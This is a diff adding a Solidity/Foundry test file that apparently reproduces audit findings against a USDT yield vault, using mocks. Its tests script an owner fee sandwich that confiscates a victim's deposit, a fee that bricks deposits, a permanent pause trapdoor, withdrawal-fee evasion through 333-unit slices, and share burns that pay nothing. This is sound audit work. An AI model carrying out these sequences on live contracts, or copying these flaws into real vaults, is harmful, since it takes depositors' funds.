+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+import {Test} from "forge-std/Test.sol";
+import {Pausable} from "@openzeppelin/contracts/utils/Pausable.sol";
+
+import {UsdtYieldVault} from "../../src/UsdtYieldVault.sol";
+import {MockUSDT} from "../mocks/MockUSDT.sol";
+import {MockAavePool, MockAToken} from "../mocks/MockAavePool.sol";
+
+/// @notice Offline reproductions, using the project's own mocks unmodified.
+///         Every test here states a property a depositor would assume holds.
+contract VaultExploitsTest is Test {
+    UsdtYieldVault vault;
+    MockUSDT usdt;
+    MockAavePool pool;
+    MockAToken aUsdt;
+
+    address owner = makeAddr("owner");
+    address victim = makeAddr("victim");
+
+    function setUp() public {
+        usdt = new MockUSDT();
+        pool = new MockAavePool(address(usdt));
+        aUsdt = pool.aToken();
+        vault = new UsdtYieldVault(address(usdt), address(aUsdt), address(pool), 0, owner);
+
+        usdt.mint(owner, 1_000_000e6);
+        usdt.mint(victim, 1_000_000e6);
+        vm.prank(owner);
+        usdt.approve(address(vault), type(uint256).max);
+        vm.prank(victim);
+        usdt.approve(address(vault), type(uint256).max);
+    }
+
+    function _deposit(address who, uint256 amount) internal returns (uint256) {
+        vm.prank(who);
+        return vault.deposit(amount);
+    }
+
+    function _withdrawAll(address who) internal returns (uint256) {
+        uint256 shares = vault.shareBalance(who);
+        vm.prank(who);
+        return vault.withdraw(shares);
+    }
+
+    /*//////////////////////////////////////////////////////////////
+       F3: the owner can sandwich a deposit and take almost all of it
+    //////////////////////////////////////////////////////////////*/
+
+    /// @notice A depositor should get back roughly what they put in, minus the
+    ///         published fees, no matter what the owner does in the same block.
+    function test_OwnerCannotStealAPendingDeposit() public {
+        // Owner is an ordinary depositor first, at the advertised 0 bps fee.
+        _deposit(owner, 10_000e6);
+
+        // Victim broadcasts deposit(10_000e6). Owner front-runs it in the same block.
+        vm.prank(owner);
+        vault.setDepositFee(9_900); // no upper bound, no timelock, effective immediately
+
+        _deposit(victim, 10_000e6);
+
+        // Owner back-runs, restoring the fee so the next victim sees nothing wrong.
+        vm.prank(owner);
+        vault.setDepositFee(0);
+
+        uint256 ownerOut = _withdrawAll(owner);
+        uint256 victimOut = _withdrawAll(victim);
+
+        emit log_named_uint("owner   put in 10000e6, took out", ownerOut);
+        emit log_named_uint("victim  put in 10000e6, took out", victimOut);
+        emit log_named_uint("owner's profit                  ", ownerOut - 10_000e6);
+
+        assertGe(victimOut, 10_000e6 * 9_700 / 10_000, "victim's deposit was confiscated");
+    }
+
+    /// @notice setDepositFee should not be able to brick the vault outright.
+    function test_DepositFeeCannotExceedOneHundredPercent() public {
+        vm.prank(owner);
+        vault.setDepositFee(10_001); // accepted without complaint
+
+        vm.prank(victim);
+        vault.deposit(1_000e6); // arithmetic underflow in `amount - fee`
+    }
+
+    /*//////////////////////////////////////////////////////////////
+       F4: pause is a one-way trapdoor over user funds
+    //////////////////////////////////////////////////////////////*/
+
+    /// @notice Pausing should stop new money coming in, not lock existing money in.
+    function test_UsersCanExitWhilePaused() public {
+        _deposit(victim, 10_000e6);
+
+        vm.prank(owner);
+        vault.pause();
+
+        uint256 shares = vault.shareBalance(victim);
+        vm.prank(victim);
+        vault.withdraw(shares);
+    }
+
+    /// @notice And ownership can be renounced, making the pause permanent.
+    function test_PauseCannotBeMadePermanent() public {
+        _deposit(victim, 10_000e6);
+
+        vm.startPrank(owner);
+        vault.pause();
+        vault.renounceOwnership();
+        vm.stopPrank();
+
+        assertEq(vault.owner(), address(0));
+        assertFalse(vault.paused(), "vault is paused forever with no owner left to unpause it");
+    }
+
+    /*//////////////////////////////////////////////////////////////
+       F5: the 30 bps withdrawal fee is trivially avoidable
+    //////////////////////////////////////////////////////////////*/
+
+    /// @notice Everyone exiting the vault should pay the same 30 bps.
+    function test_WithdrawalFeeCannotBeRoundedAway() public {
+        _deposit(victim, 1_000e6);
+
+        // 30 bps of anything below 334 base units floors to zero, so exit in slices.
+        uint256 sliceShares = vault.convertToShares(333);
+        uint256 got;
+        for (uint256 i = 0; i < 200; i++) {
+            vm.prank(victim);
+            got += vault.withdraw(sliceShares);
+        }
+
+        uint256 grossOut = 200 * 333;
+        emit log_named_uint("gross value of the 200 slices", grossOut);
+        emit log_named_uint("actually paid out            ", got);
+        assertEq(got, grossOut - (grossOut * 30) / 10_000, "withdrawal fee was avoided entirely");
+    }
+
+    /*//////////////////////////////////////////////////////////////
+       F6: shares can be burned for nothing
+    //////////////////////////////////////////////////////////////*/
+
+    /// @notice Burning shares should never pay out zero.
+    function test_WithdrawNeverBurnsSharesForNothing() public {
+        _deposit(victim, 1_000e6);
+
+        uint256 sharesBefore = vault.shareBalance(victim);
+        uint256 dust = vault.convertToShares(1) - 1; // worth 0.999... base units
+
+        vm.prank(victim);
+        uint256 out = vault.withdraw(dust);
+
+        emit log_named_uint("shares burned", sharesBefore - vault.shareBalance(victim));
+        emit log_named_uint("USDT received", out);
+        assertGt(out, 0, "shares were burned and nothing was paid out");
+    }
+}
